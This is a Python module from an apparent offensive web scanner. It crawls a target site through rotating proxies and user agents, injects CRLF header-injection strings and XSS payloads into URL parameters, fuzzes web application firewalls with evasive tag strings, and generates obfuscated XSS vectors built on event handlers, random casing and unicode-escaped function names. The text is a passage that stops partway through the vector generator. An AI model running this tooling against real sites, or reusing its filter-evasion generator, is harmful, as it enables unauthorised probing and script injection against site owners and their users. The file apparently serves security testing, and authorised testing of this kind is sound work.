import base64
import concurrent.futures
import copy
import os
import random
import re
import sys
import glob
import threading
from urllib.parse import unquote, urlparse
import bs4
import html_similarity
from termcolor import cprint
from fuzzywuzzy import fuzz
from bypasser.waf_mitigation import waf_detector
from reporting.results_manager import write_xss_vectors
from vpn_proxies.proxies_manager import prepare_proxies


from utils.app_config import (
    USER_AGENTS,
)

from attacks.xss.xss_cve import retire_js

from requester.request_manager import (
    escaped,
    fill_holes,
    get_params,
    get_url,
    inject_params,
    is_bad_context,
    js_extractor,
    replace_value,
    start_request,
    stripper,
)

# Color
white = "\033[97m"
green = "\033[92m"
red = "\033[91m"
yellow = "\033[93m"
end = "\033[0m"
back = "\033[7;91m"
info = "\033[93m[!]\033[0m"
que = "\033[94m[?]\033[0m"
bad = "\033[91m[-]\033[0m"
good = "\033[92m[+]\033[0m"
run = "\033[97m[~]\033[0m"

# Escape characters
# TODO
escape_chars = [
    "%0d",
    "%0a",
    "%0d%20",
    "%0a%20",
    "%3f",
    "%0d%0a",
    "%23%0d",
    "%23%0a",
    "%23%0d%0a",
    "%u000a",
    "%25%30%61",
    "%25%30a",
    "%3f%0d",
    "%3f%0d%0a",
    "%3f%0a",
    "%%0a0a",
    "%u000d",
    "%u0000",
    "%0d%09",
    "%0d%0a%09",
    "%0d%0a%20",
    "%25250a",
    "%250a",
    "%2F..%0d%0a",
    "%2f%2e%2e%0d%0a",
    "%25%30",
    "%2e%2e%2f%0d%0a",
    "%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D",
    "%E5%98%8A%E5%98%8D",
    "%e5%98%8a%e5%98%8d%0a",
    "%e5%98%8a%e5%98%8d%0d",
    "%e5%98%8a%e5%98%8d%0d%0a",
    f"\\r",
    f"\\r\\n",
    f"\\r\\t",
    f"\\r\\n\\t",
    f"\\r%20",
    f"\\r\\n%20",
]


blindParams = [  # common paramtere names to be bruteforced for parameter discovery
    "redirect",
    "redir",
    "url",
    "link",
    "goto",
    "debug",
    "_debug",
    "test",
    "get",
    "index",
    "src",
    "source",
    "file",
    "frame",
    "config",
    "new",
    "old",
    "var",
    "rurl",
    "return_to",
    "_return",
    "returl",
    "last",
    "text",
    "load",
    "email",
    "mail",
    "user",
    "username",
    "password",
    "pass",
    "passwd",
    "first_name",
    "last_name",
    "back",
    "href",
    "ref",
    "data",
    "input",
    "out",
    "net",
    "host",
    "address",
    "code",
    "auth",
    "userid",
    "auth_token",
    "token",
    "error",
    "keyword",
    "key",
    "q",
    "query",
    "aid",
    "bid",
    "cid",
    "did",
    "eid",
    "fid",
    "gid",
    "hid",
    "iid",
    "jid",
    "kid",
    "lid",
    "mid",
    "nid",
    "oid",
    "pid",
    "qid",
    "rid",
    "sid",
    "tid",
    "uid",
    "vid",
    "wid",
    "xid",
    "yid",
    "zid",
    "cal",
    "country",
    "x",
    "y",
    "topic",
    "title",
    "head",
    "higher",
    "lower",
    "width",
    "height",
    "add",
    "result",
    "log",
    "demo",
    "example",
    "message",
]

fuzzes = (  # Fuzz strings to test WAFs
    "<test",
    "<test//",
    "<test>",
    "<test x>",
    "<test x=y",
    "<test x=y//",
    "<test/oNxX=yYy//",
    "<test oNxX=yYy>",
    "<test onload=x",
    "<test/o%00nload=x",
    "<test sRc=xxx",
    "<test data=asa",
    "<test data=javascript:asa",
    "<svg x=y>",
    "<details x=y//",
    "<a href=x//",
    "<emBed x=y>",
    "<object x=y//",
    "<bGsOund sRc=x>",
    "<iSinDEx x=y//",
    "<aUdio x=y>",
    "<script x=y>",
    "<script//src=//",
    '">payload<br/attr="',
    '"-confirm``-"',
    "<test ONdBlcLicK=x>",
    "<test/oNcoNTeXtMenU=x>",
    "<test OndRAgOvEr=x>",
)

# payloads below this efficiency will not be displayed
minEfficiency = 90

# attributes that have special properties
specialAttributes = ["srcdoc", "src"]

badTags = ("iframe", "title", "textarea", "noembed", "style", "template", "noscript")

# HTML Tags
tags = ("html", "d3v", "a", "details")

# "Things" that can be used between js functions and breakers e.g. '};alert()//
jFillings = ";"
# "Things" that can be used before > e.g. <tag attr=value%0dx>
lFillings = ("", "%0dx")
# "Things" to use between event handler and = or between function and =
eFillings = ("%09", "%0a", "%0d", "+")
# "Things" to use instead of space
fillings = ("%09", "%0a", "%0d", "/+/")
# Event handlers and the tags compatible with them
eventHandlers = {
    "ontoggle": ["details"],
    "onpointerenter": ["d3v", "details", "html", "a"],
    "onmouseover": ["a", "html", "d3v"],
}

# JavaScript functions to get a popup
functions = (
    "[8].find(confirm)",
    "confirm()",
    "(confirm)()",
    "co\u006efir\u006d()",
    "(prompt)``",
    "a=prompt,a()",
)

xsschecker = "v3dm0s"  # A non malicious string to check for reflections and stuff

checkedForms = {}  # Forms that have been checked


# Load proxies from file
def load_xss_payload():
    """_summary_
    TODO manage vulnebility type
    Returns:
        _type_: _description_
    """
    payloads = []
    for payload_file in glob.glob("attacks/xss/payloads/*"):
        # Extract the vulnerability type from the filename
        with open(payload_file, "r", errors="ignore") as file:
            # Assuming each file may contain multiple payloads, one per line
            payloads.append([line for line in file.readlines()])
    return payloads


def generate_xss_urls(url):
    """
    Adds payload to the URL and returns a set of parsed URLs

    Args:
        url (str): The URL to generate XSS URLs for.

    Returns:
        tuple: A tuple containing a set of parsed URLs and the total number of parsed URLs.

    """
    xss_payloads = load_xss_payload()
    injection = "Set-Cookie:nefcore=crlfsuite;"
    parsed_urls = set()
    verify_param = re.compile(r"=[^?\|&]*")
    is_param = verify_param.search(url)

    # These strings are used before the escape characters
    starting_strings = ["", "crlfsuite", "?crlfsuite=", "#", "__session_start__/"]

    if is_param:
        del starting_strings[2]
        for string in starting_strings:
            for each_escape in escape_chars:
                injected_urls = inject_params(url, string + each_escape + injection)
                for each_injected_url in injected_urls:
                    parsed_urls.add(each_injected_url)

        for payloads in xss_payloads:
            for payload in payloads:
                _injected = inject_params(url, payload)
                for injected in _injected:
                    parsed_urls.add(injected)
    else:
        if not url.endswith("/"):
            url = url + "/"
        for string in starting_strings:
            for each_escape in escape_chars:
                parsed_urls.add(url + string + each_escape + injection)
        for payloads in xss_payloads:
            for payload in payloads:
                parsed_urls.add(url + payload)
    total_len = len(parsed_urls)

    return parsed_urls, total_len


def base64_encoder(string):
    if re.match(r"^[A-Za-z0-9+\/=]+$", string) and (len(string) % 4) == 0:
        return base64.b64decode(string.encode("utf-8")).decode("utf-8")
    else:
        return base64.b64encode(string.encode("utf-8")).decode("utf-8")


def dom(response):
    """
    Analyzes the given response for potential DOM-based Cross-Site Scripting (XSS) vulnerabilities.

    Args:
        response (str): The response to analyze.

    Returns:
        list: A list of highlighted lines in the response that may contain XSS vulnerabilities.
    """
    highlighted = []
    sources = r"""\b(?:document\.(URL|documentURI|URLUnencoded|baseURI|cookie|referrer)|location\.(href|search|hash|pathname)|window\.name|history\.(pushState|replaceState)(local|session)Storage)\b"""
    sinks = r"""\b(?:eval|evaluate|execCommand|assign|navigate|getResponseHeaderopen|showModalDialog|Function|set(Timeout|Interval|Immediate)|execScript|crypto.generateCRMFRequest|ScriptElement\.(src|text|textContent|innerText)|.*?\.onEventName|document\.(write|writeln)|.*?\.innerHTML|Range\.createContextualFragment|(document|window)\.location)\b"""
    scripts = re.findall(r"(?i)(?s)<script[^>]*>(.*?)</script>", response)
    sinkFound, sourceFound = False, False
    for script in scripts:
        script = script.split("\n")
        num = 1
        allControlledVariables = set()
        try:
            for newLine in script:
                line = newLine
                parts = line.split("var ")
                controlledVariables = set()
                if len(parts) > 1:
                    for part in parts:
                        for controlledVariable in allControlledVariables:
                            if controlledVariable in part:
                                controlledVariables.add(
                                    re.search(r"[a-zA-Z$_][a-zA-Z0-9$_]+", part)
                                    .group()
                                    .replace("$", "\$")
                                )
                pattern = re.finditer(sources, newLine)
                for grp in pattern:
                    if grp:
                        source = newLine[grp.start() : grp.end()].replace(" ", "")
                        if source:
                            if len(parts) > 1:
                                for part in parts:
                                    if source in part:
                                        controlledVariables.add(
                                            re.search(r"[a-zA-Z$_][a-zA-Z0-9$_]+", part)
                                            .group()
                                            .replace("$", "\$")
                                        )
                            line = line.replace(source, yellow + source + end)
                for controlledVariable in controlledVariables:
                    allControlledVariables.add(controlledVariable)
                for controlledVariable in allControlledVariables:
                    matches = list(
                        filter(None, re.findall(r"\b%s\b" % controlledVariable, line))
                    )
                    if matches:
                        sourceFound = True
                        line = re.sub(
                            r"\b%s\b" % controlledVariable,
                            yellow + controlledVariable + end,
                            line,
                        )
                pattern = re.finditer(sinks, newLine)
                for grp in pattern:
                    if grp:
                        sink = newLine[grp.start() : grp.end()].replace(" ", "")
                        if sink:
                            # line = line.replace(sink, red + sink + end)
                            sinkFound = True
                if line != newLine:
                    highlighted.append("%-3s %s" % (str(num), line.lstrip(" ")))
                num += 1
        except MemoryError:
            pass
    if sinkFound or sourceFound:
        return highlighted
    else:
        return []


def zetanize(response):
    """Extracts form information from an HTML response.

    This function takes an HTML response as input and extracts information about the forms present in the response.
    It removes the content between HTML comments and then uses regular expressions to extract form details such as action,
    method, and input fields.

    Args:
        response (str): The HTML response string.

    Returns:
        dict: A dictionary containing information about the forms present in the HTML response. The dictionary has the following structure:
            {
                form_number: {
                    "action": action_url,
                    "method": form_method,
                    "inputs": [
                        {
                            "name": input_name,
                            "type": input_type,
                            "value": input_value
                        },
                        ...
                    ]
                },
                ...
            }
        Each form is represented by a unique form_number, starting from 0. The "action" key represents the URL where the form data should be submitted.
        The "method" key represents the HTTP method to be used for form submission (default is "get" if not specified).
        The "inputs" key is a list of dictionaries, where each dictionary represents an input field in the form. Each input field dictionary has
        "name", "type", and "value" keys representing the name, type, and initial value of the input field respectively.

    """

    def e(string):
        return string.encode("utf-8")

    def d(string):
        return string.decode("utf-8")

    # remove the content between html comments
    response = re.sub(r"(?s)<!--.*?-->", "", response)
    forms = {}
    matches = re.findall(
        r"(?i)(?s)<form.*?</form.*?>", response
    )  # extract all the forms
    num = 0
    for match in matches:  # everything else is self explanatory if you know regex
        page = re.search(r'(?i)action=[\'"](.*?)[\'"]', match)
        method = re.search(r'(?i)method=[\'"](.*?)[\'"]', match)
        forms[num] = {}
        forms[num]["action"] = d(e(page.group(1))) if page else ""
        forms[num]["method"] = d(e(method.group(1)).lower()) if method else "get"
        forms[num]["inputs"] = []
        inputs = re.findall(r"(?i)(?s)<input.*?>", response)
        for inp in inputs:
            inpName = re.search(r'(?i)name=[\'"](.*?)[\'"]', inp)
            if inpName:
                inpType = re.search(r'(?i)type=[\'"](.*?)[\'"]', inp)
                inpValue = re.search(r'(?i)value=[\'"](.*?)[\'"]', inp)
                inpName = d(e(inpName.group(1)))
                inpType = d(e(inpType.group(1))) if inpType else ""
                inpValue = d(e(inpValue.group(1))) if inpValue else ""
                if inpType.lower() == "submit" and inpValue == "":
                    inpValue = "Submit Query"
                inpDict = {"name": inpName, "type": inpType, "value": inpValue}
                forms[num]["inputs"].append(inpDict)
        num += 1
    return forms


processed = set()  # urls that have been crawled
processed_content = {}
lock_processed = threading.Lock()


def photon_crawler(seedUrl, config, proxy, processed_xss_photon_crawl, threshold=0.9):
    """Crawls a website to find forms and links for XSS vulnerability testing.
    # TODO update to crawl also for sqli

    Args:
        seedUrl (str): The starting URL for crawling.
        config (dict): Configuration settings for the crawler.
        proxy (str): Proxy settings for making requests.

    Returns:
        list: A list containing the found forms and processed URLs.
    """

    forms = []  # web forms
    storage = set()  # urls that belong to the target i.e. in-scope
    schema = urlparse(seedUrl).scheme  # extract the scheme e.g. http or https
    host = urlparse(seedUrl).netloc  # extract the host e.g. example.com
    main_url = schema + "://" + host  # join scheme and host to make the root url
    storage.add(seedUrl)  # add the url to storage
    checkedDOMs = []

    def recursive_crawl(target):
        """_summary_

        Args:
            target (_type_): _description_
        """
        with lock_processed:
            processed.add(target)
        printableTarget = "/".join(target.split("/")[3:])
        if len(printableTarget) > 40:
            printableTarget = printableTarget[-40:]
        else:
            printableTarget = printableTarget + (" " * (40 - len(printableTarget)))
        cprint("Parsing %s\r" % printableTarget, color="yellow", file=sys.stderr)
        url = get_url(target, True)

        params = get_params(target, "", True)
        if "=" in target:  # if there's a = in the url, there should be GET parameters
            inps = []
            if params:
                for name, value in params.items():
                    inps.append({"name": name, "value": value})
            forms.append({0: {"action": url, "method": "get", "inputs": inps}})

        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "X-HackerOne-Research": "elniak",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip,deflate",
            "cache-control": "max-age=0",
            "Connection": "close",
            "DNT": "1",
            "Upgrade-Insecure-Requests": "1",
        }

        # TODO add session
        proxies = prepare_proxies(proxy, config)
        cprint(
            f"Searching for GET - Session (n° 0): {url} \n\t - parameters {params} \n\t - headers {headers} \n\t - xss - with proxy {proxies} ...",
            "yellow",
            file=sys.stderr,
        )
        response = start_request(
            proxies=proxies,
            config=config,
            base_url=url,
            params=params,
            secured=(
                True
                if proxies and "https" in proxies and "socks" in proxies["https"]
                else False
            ),
            GET=True,
            headers=headers,
        )

        if hasattr(response, "text"):
            response = response.text
        else:
            response = ""

        with lock_processed:
            for p in processed_content:
                if processed_content[p] and response:
                    try:
                        similarity = html_similarity.structural_similarity(
                            processed_content[p], response
                        )
                    except Exception as e:
                        cprint(
                            f"Error while comparing HTML content similarity: {e}",
                            "red",
                            file=sys.stderr,
                        )
                        similarity = 0
                    if similarity > threshold:
                        cprint(
                            f"Skipping already processed URL: {target} - similarity ratio: {similarity} with {p}",
                            "blue",
                            file=sys.stderr,
                        )
                        return
            processed_content[target] = response

        retire_js(url, response, config, proxies)

        if not config["skip_dom"]:
            highlighted = dom(response)
            clean_highlighted = "".join(
                [re.sub(r"^\d+\s+", "", line) for line in highlighted]
            )
            if highlighted and clean_highlighted not in checkedDOMs:
                checkedDOMs.append(clean_highlighted)
                cprint(
                    "Potentially vulnerable DOM objects found at %s" % url,
                    color="green",
                    file=sys.stderr,
                )
                with lock_processed:
                    with open(
                        os.path.join(
                            config["experiment_folder"], "xss_dom_vectors.txt"
                        ),
                        "a",
                    ) as file:
                        file.write("URL: " + url + "\n")
                        for line in highlighted:
                            cprint(line, color="green", file=sys.stderr)
                            file.write(line + "\n")
                        file.write("\n")

        forms.append(zetanize(response))

        matches = re.findall(r'<[aA].*href=["\']{0,1}(.*?)["\']', response)
        for link in matches:
            # iterate over the matches
            # remove everything after a "#" to deal with in-page anchors
            link = link.split("#")[0]
            if link.endswith(
                (".pdf", ".png", ".jpg", ".jpeg", ".xls", ".xml", ".docx", ".doc")
            ):
                pass
            else:
                if link[:4] == "http":
                    if link.startswith(main_url):
                        storage.add(link)
                elif link[:2] == "//":
                    if link.split("/")[2].startswith(host):
                        storage.add(schema + link)
                elif link[:1] == "/":
                    storage.add(main_url + link)
                else:
                    storage.add(main_url + "/" + link)

        cprint(
            "Found %s forms and %s links\r" % (len(forms), len(storage)),
            color="green",
            file=sys.stderr,
        )
        cprint(
            "Processed %s urls\r" % len(processed),
            color="green",
            file=sys.stderr,
        )
        cprint(
            "Storage %s urls\r" % len(storage),
            color="green",
            file=sys.stderr,
        )

    try:
        for x in range(config["level"]):
            with lock_processed:
                urls = storage - processed
            # urls to crawl = all urls - urls that have been crawled

            if seedUrl in processed_xss_photon_crawl:
                # TODO
                cprint(
                    f"Skipping already processed seedUrl: {seedUrl}",
                    "yellow",
                    file=sys.stderr,
                )
                return [forms, checkedDOMs, seedUrl]

            cprint(
                "Crawling %s urls for forms and links\r" % len(urls),
                color="yellow",
                file=sys.stderr,
            )

            with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
                future_to_search = {
                    executor.submit(recursive_crawl, url): url for url in urls
                }
                # for website in tqdm(
                #     concurrent.futures.as_completed(future_to_search),
                #     desc=f"Photon Crawling recursive_crawl links DB for xss website",
                #     unit="site",
                #     total=len(future_to_search),
                # ):
                for website in concurrent.futures.as_completed(future_to_search):
                    website.result()

            # threadpool = concurrent.futures.ThreadPoolExecutor(max_workers=30)
            # futures = (threadpool.submit(recursive_crawl, url) for url in urls)
            # for i in concurrent.futures.as_completed(futures):
            #     pass
    except KeyboardInterrupt:
        return [forms, checkedDOMs, seedUrl]
    return [forms, checkedDOMs, seedUrl]


def html_xss_parser(response, encoding):
    """Parse the HTML response for XSS vulnerabilities.

    This function takes the HTTP response and the encoding as input and analyzes the response for XSS vulnerabilities.
    It identifies the positions and contexts of potential XSS vulnerabilities in the response.

    Args:
        response (requests.Response): The HTTP response object.
        encoding (function): The encoding function to be used for encoding the probe.

    Returns:
        dict: A dictionary containing the positions, contexts, and details of potential XSS vulnerabilities.
            The dictionary has the following structure:
            {
                position: {
                    "position": int,
                    "context": str,
                    "details": {
                        "tag": str (only for "attribute" context),
                        "type": str (only for "attribute" context),
                        "quote": str (only for "attribute" context),
                        "value": str (only for "attribute" context),
                        "name": str (only for "attribute" context),
                        "badTag": str (only if the position is in a non-executable context)
                    }
                },
                ...
            }
    """
    rawResponse = response  # raw response returned by requests
    if response:
        response = response.text  # response content
    else:
        response = ""
    if encoding:  # if the user has specified an encoding, encode the probe in that
        response = response.replace(encoding(xsschecker), xsschecker)
    reflections = response.count(xsschecker)
    position_and_context = {}
    environment_details = {}
    clean_response = re.sub(r"<!--[.\s\S]*?-->", "", response)
    script_checkable = clean_response
    for script in js_extractor(script_checkable):
        occurences = re.finditer(r"(%s.*?)$" % xsschecker, script)
        if occurences:
            for occurence in occurences:
                thisPosition = occurence.start(1)
                position_and_context[thisPosition] = "script"
                environment_details[thisPosition] = {}
                environment_details[thisPosition]["details"] = {"quote": ""}
                for i in range(len(occurence.group())):
                    currentChar = occurence.group()[i]
                    if currentChar in ("/", "'", "`", '"') and not escaped(
                        i, occurence.group()
                    ):
                        environment_details[thisPosition]["details"][
                            "quote"
                        ] = currentChar
                    elif currentChar in (")", "]", "}", "}") and not escaped(
                        i, occurence.group()
                    ):
                        break
                script_checkable = script_checkable.replace(xsschecker, "", 1)
    if len(position_and_context) < reflections:
        attribute_context = re.finditer(
            r"<[^>]*?(%s)[^>]*?>" % xsschecker, clean_response
        )
        for occurence in attribute_context:
            match = occurence.group(0)
            thisPosition = occurence.start(1)
            parts = re.split(r"\s", match)
            tag = parts[0][1:]
            for part in parts:
                if xsschecker in part:
                    Type, quote, name, value = "", "", "", ""
                    if "=" in part:
                        quote = re.search(r'=([\'`"])?', part).group(1)
                        name_and_value = part.split("=")[0], "=".join(
                            part.split("=")[1:]
                        )
                        if xsschecker == name_and_value[0]:
                            Type = "name"
                        else:
                            Type = "value"
                        name = name_and_value[0]
                        value = (
                            name_and_value[1].rstrip(">").rstrip(quote).lstrip(quote)
                        )
                    else:
                        Type = "flag"
                    position_and_context[thisPosition] = "attribute"
                    environment_details[thisPosition] = {}
                    environment_details[thisPosition]["details"] = {
                        "tag": tag,
                        "type": Type,
                        "quote": quote,
                        "value": value,
                        "name": name,
                    }
    if len(position_and_context) < reflections:
        html_context = re.finditer(xsschecker, clean_response)
        for occurence in html_context:
            thisPosition = occurence.start()
            if thisPosition not in position_and_context:
                position_and_context[occurence.start()] = "html"
                environment_details[thisPosition] = {}
                environment_details[thisPosition]["details"] = {}
    if len(position_and_context) < reflections:
        comment_context = re.finditer(
            r"<!--[\s\S]*?(%s)[\s\S]*?-->" % xsschecker, response
        )
        for occurence in comment_context:
            thisPosition = occurence.start(1)
            position_and_context[thisPosition] = "comment"
            environment_details[thisPosition] = {}
            environment_details[thisPosition]["details"] = {}
    database = {}
    for i in sorted(position_and_context):
        database[i] = {}
        database[i]["position"] = i
        database[i]["context"] = position_and_context[i]
        database[i]["details"] = environment_details[i]["details"]

    bad_contexts = re.finditer(
        r"(?s)(?i)<(style|template|textarea|title|noembed|noscript)>[.\s\S]*(%s)[.\s\S]*</\1>"
        % xsschecker,
        response,
    )
    non_executable_contexts = []
    for each in bad_contexts:
        non_executable_contexts.append([each.start(), each.end(), each.group(1)])

    if non_executable_contexts:
        for key in database.keys():
            position = database[key]["position"]
            badTag = is_bad_context(position, non_executable_contexts)
            if badTag:
                database[key]["details"]["badTag"] = badTag
            else:
                database[key]["details"]["badTag"] = ""
    return database


def checker(config, proxy, url, params, GET, payload, positions, encoding):
    """Check the efficiency of XSS filter evasion payloads.

    This function sends a request to the target URL with different XSS payloads and
    measures the efficiency of each payload in evading XSS filters. It returns a list
    of efficiency scores for each occurrence of the payload in the response.

    Args:
        config (dict): The configuration settings.
        proxy (str): The proxy server to use.
        url (str): The target URL.
        params (dict): The parameters to inject payloads into.
        GET (bool): Flag indicating if the request is a GET request.
        payload (str): The payload to test for XSS vulnerability.
        positions (list): The positions of the reflected payload in the response.
        encoding (bool): Flag indicating if the payloads should be URL encoded.

    Returns:
        list: The efficiency scores of the payloads for each occurrence.

    Raises:
        IndexError: If an index error occurs while processing the response.

    """
    checkString = "st4r7s" + payload + "3nd"
    if encoding:
        checkString = encoding(unquote(checkString))

    proxies = prepare_proxies(proxy, config)
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "X-HackerOne-Research": "elniak",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip,deflate",
        "cache-control": "max-age=0",
        "Connection": "close",
        "DNT": "1",
        "Upgrade-Insecure-Requests": "1",
    }
    response = start_request(
        proxies=proxies,
        config=config,
        base_url=url,
        params=replace_value(params, xsschecker, checkString, copy.deepcopy),
        headers=headers,
        GET=GET,
    )

    if response:
        if hasattr(response, "text"):
            response = response.text.lower()
        else:
            response = response.read().decode("utf-8")

    reflectedPositions = []
    try:
        for match in re.finditer("st4r7s", response):
            reflectedPositions.append(match.start())
    except Exception as e:
        cprint(
            "An error occurred while processing the st4r7s, response - {e}",
            color="red",
            file=sys.stderr,
        )
        pass
    filledPositions = fill_holes(positions, reflectedPositions)
    #  Itretating over the reflections
    num = 0
    efficiencies = []
    for position in filledPositions:
        allEfficiencies = []
        try:
            reflected = response[
                reflectedPositions[num] : reflectedPositions[num] + len(checkString)
            ]
            efficiency = fuzz.partial_ratio(reflected, checkString.lower())
            allEfficiencies.append(efficiency)
        except IndexError:
            pass
        if position:
            reflected = response[position : position + len(checkString)]
            if encoding:
                checkString = encoding(checkString.lower())
            efficiency = fuzz.partial_ratio(reflected, checkString)
            if reflected[:-2] == (
                "\\%s" % checkString.replace("st4r7s", "").replace("3nd", "")
            ):
                efficiency = 90
            allEfficiencies.append(efficiency)
            efficiencies.append(max(allEfficiencies))
        else:
            efficiencies.append(0)
        num += 1
    return list(filter(None, efficiencies))


def check_filter_efficiency(config, proxy, url, params, GET, occurences, encoding):
    """Check the efficiency of XSS filter evasion payloads.

    Args:
        config (dict): The configuration settings.
        proxy (str): The proxy server to use.
        url (str): The target URL.
        params (dict): The parameters to inject payloads into.
        GET (bool): Flag indicating if the request is a GET request.
        occurences (dict): The occurrences of XSS vulnerabilities.
        encoding (bool): Flag indicating if the payloads should be URL encoded.

    Returns:
        dict: The efficiency scores of the payloads for each occurrence.
    """
    positions = occurences.keys()
    sortedEfficiencies = {}
    # adding < > to environments anyway because they can be used in all contexts
    environments = set(["<", ">"])
    for i in range(len(positions)):
        sortedEfficiencies[i] = {}
    for i in occurences:
        occurences[i]["score"] = {}
        context = occurences[i]["context"]
        if context == "comment":
            environments.add("-->")
        elif context == "script":
            environments.add(occurences[i]["details"]["quote"])
            environments.add("</scRipT/>")
        elif context == "attribute":
            if occurences[i]["details"]["type"] == "value":
                if (
                    occurences[i]["details"]["name"] == "srcdoc"
                ):  # srcdoc attribute accepts html data with html entity encoding
                    environments.add("&lt;")  # so let's add the html entity
                    environments.add("&gt;")  # encoded versions of < and >
            if occurences[i]["details"]["quote"]:
                environments.add(occurences[i]["details"]["quote"])
    for environment in environments:
        if environment:
            efficiencies = checker(
                config,
                proxy,
                url,
                params,
                GET,
                environment,
                positions,
                encoding,
            )
            efficiencies.extend([0] * (len(occurences) - len(efficiencies)))
            for occurence, efficiency in zip(occurences, efficiencies):
                occurences[occurence]["score"][environment] = efficiency
    return occurences


def random_upper(string):
    return "".join(
        random.choice((x, y)) for x, y in zip(string.upper(), string.lower())
    )


def genGen(
    fillings, eFillings, lFillings, eventHandlers, tags, functions, ends, badTag=None
):
    """Generate XSS attack vectors based on the provided parameters.

    This function generates XSS attack vectors by combining different fillings, event handlers, tags, functions, and ends.
    It takes the following parameters:

    Args:
        fillings (list): A list of fillings to be used in the attack vectors.
        eFillings (list): A list of event fillings to be used in the attack vectors.
        lFillings (list): A list of location fillings to be used in the attack vectors.
        eventHandlers (list): A list of event handlers to be used in the attack vectors.
        tags (list): A list of tags to be used in the attack vectors.
        functions (list): A list of functions to be used in the attack vectors.
        ends (list): A list of ends to be used in the attack vectors.
        badTag (str, optional): A bad tag to be used in the attack vectors. Defaults to None.

    Returns:
        list: A list of generated XSS attack vectors.

    Note:
        - The `fillings`, `eFillings`, `lFillings`, `eventHandlers`, `tags`, `functions`, and `ends` parameters should be non-empty lists.
        - The `badTag` parameter is optional. If provided, it will be used in the attack vectors.
    """
    vectors = []
    r = random_upper  # random_upper randomly converts chars of a string to uppercase
    for tag in tags:
        if tag == "d3v" or tag == "a":
            bait = xsschecker
        else:
            bait = ""
        for eventHandler in eventHandlers:
            # if the tag is compatible with the event handler
            if tag in eventHandlers[eventHandler]:
                for function in functions:
                    for filling in fillings:
                        for eFilling in eFillings:
                            for lFilling in lFillings:
                                for end in ends:
                                    if tag == "d3v" or tag == "a":
                                        if ">" in ends:
                                            end = ">"  # we can't use // as > with "a" or "d3v" tag
                                    breaker = ""
                                    if badTag:
                                        breaker = "</" + random_upper(badTag) + ">"
                                    vector = (
                                        breaker
                                        + "<"
                                        + random_upper(tag)
                                        + filling
                                        + random_upper(eventHandler)
                                        + eFilling
                                        + "="
                                        + eFilling
                                        + function
                                        + lFilling
                                        + end
                                        + bait
                                    )
                                    vectors.append(vector)
    return vectors


def js_contexter(script):
    """Extracts JavaScript context from a given script.

    This function takes a script as input and extracts the JavaScript context from it.
    It removes everything that is between {..}, "..." or '...' and performs additional
    character replacements to obtain the JavaScript context.

    Args:
        script (str): The input script from which the JavaScript context needs to be extracted.

    Returns:
        str: The extracted JavaScript context.

    """
    broken = script.split(xsschecker)
    pre = broken[0]
    #  remove everything that is between {..}, "..." or '...'
    pre = re.sub(r'(?s)\{.*?\}|(?s)\(.*?\)|(?s)".*?"|(?s)\'.*?\'', "", pre)
    breaker = ""
    num = 0
    for char in pre:  # iterate over the remaining characters
        if char == "{":
            breaker += "}"
        elif char == "(":
            breaker += (
                ";)"  # yes, it should be ); but we will invert the whole thing later
            )
        elif char == "[":
            breaker += "]"
        elif char == "/":
            try:
                if pre[num + 1] == "*":
                    breaker += "/*"
            except IndexError:
                pass
        elif char == "}":
            # we encountered a } so we will strip off "our }" because this one does the job
            breaker = stripper(breaker, "}")
        elif char == ")":
            # we encountered a ) so we will strip off "our }" because this one does the job
            breaker = stripper(breaker, ")")
        elif breaker == "]":
            # we encountered a ] so we will strip off "our }" because this one does the job
            breaker = stripper(breaker, "]")
        num += 1
    return breaker[::-1]  # invert the breaker string


def generator(occurences, response):
    """
    This function takes in two parameters: 'occurences' and 'response'.
    'occurences' is a dictionary containing information about occurrences of potential XSS vulnerabilities.
    'response' is the response received from the server.

    The function first extracts JavaScript code snippets from the 'response' using the 'js_extractor' function.

    It then initializes an empty dictionary called 'vectors' to store the generated XSS payloads.

    The function iterates over each occurrence in the 'occurences' dictionary. For each occurrence, it checks the 'context' value to determine the type of vulnerability.

    If the context is 'html', it checks the efficiency scores for the '<' and '>' characters. If the efficiency score for '>' is 100, it adds the generated payloads to the 'vectors' dictionary.

    If the context is 'attribute', it checks the efficiency scores for the quote character and '>'. If both scores are 100, it adds the generated payloads to the 'vectors' dictionary.

    If the context is 'comment', it checks the efficiency score for the '<' character. If the score is 100, it adds the generated payloads to the 'vectors' dictionary.

    If the context is 'script', it extracts the JavaScript code snippet corresponding to the occurrence. It then checks the efficiency scores for the '</scRipT/>' and '>' characters. If the score for '</scRipT/>' is 100, it adds the generated payloads to the 'vectors' dictionary.

    Finally, the function returns the 'vectors' dictionary containing the generated XSS payloads.
    """
    scripts = js_extractor(response)
    index = 0
    vectors = {
        11: set(),
        10: set(),
        9: set(),
        8: set(),
        7: set(),
        6: set(),
        5: set(),
        4: set(),
        3: set(),
        2: set(),
        1: set(),
    }
    for i in occurences:
        context = occurences[i]["context"]
        if context == "html":
            lessBracketEfficiency = occurences[i]["score"]["<"]
            greatBracketEfficiency = occurences[i]["score"][">"]
            ends = ["//"]
            badTag = (
                occurences[i]["details"]["badTag"]
                if "badTag" in occurences[i]["details"]
                else ""
            )
            if greatBracketEfficiency == 100:
                ends.append(">")
            if lessBracketEfficiency:
                payloads = genGen(
                    fillings,
                    eFillings,
                    lFillings,
                    eventHandlers,
                    tags,
                    functions,
                    ends,
                    badTag,
                )
                for payload in payloads:
                    vectors[10].add(payload)
        elif context == "attribute":
            found = False
            tag = occurences[i]["details"]["tag"]
            Type = occurences[i]["details"]["type"]
            quote = occurences[i]["details"]["quote"] or ""
            attributeName = occurences[i]["details"]["name"]
            attributeValue = occurences[i]["details"]["value"]
            quoteEfficiency = (
                occurences[i]["score"][quote]
                if quote in occurences[i]["score"]
                else 100
            )
            greatBracketEfficiency = occurences[i]["score"][">"]
            ends = ["//"]
            if greatBracketEfficiency == 100:
                ends.append(">")
            if greatBracketEfficiency == 100 and quoteEfficiency == 100:
                payloads = genGen(
                    fillings, eFillings, lFillings, eventHandlers, tags, functions, ends
                )
                for payload in payloads:
                    payload = quote + ">" + payload
                    found = True
                    vectors[9].add(payload)
